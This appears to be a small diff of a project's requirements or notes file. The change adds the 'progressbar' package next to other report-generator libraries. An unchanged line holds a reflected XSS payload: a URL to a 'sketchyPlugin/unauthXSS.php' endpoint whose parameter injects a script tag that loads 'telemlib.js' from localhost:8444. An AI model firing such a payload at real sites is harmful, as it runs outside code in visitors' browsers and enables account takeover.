@@ -16,6 +16,7 @@ flask-cors
 Generator ones:
 dataframe_image
 fpdf
+progressbar
 
 
 https://targetapp.possiblymalware.com/wp-content/plugins/sketchyPlugin/unauthXSS.php?param=%3Cscript%20src=%27http://localhost:8444/lib/telemlib.js%27%3E%3C/script%3E
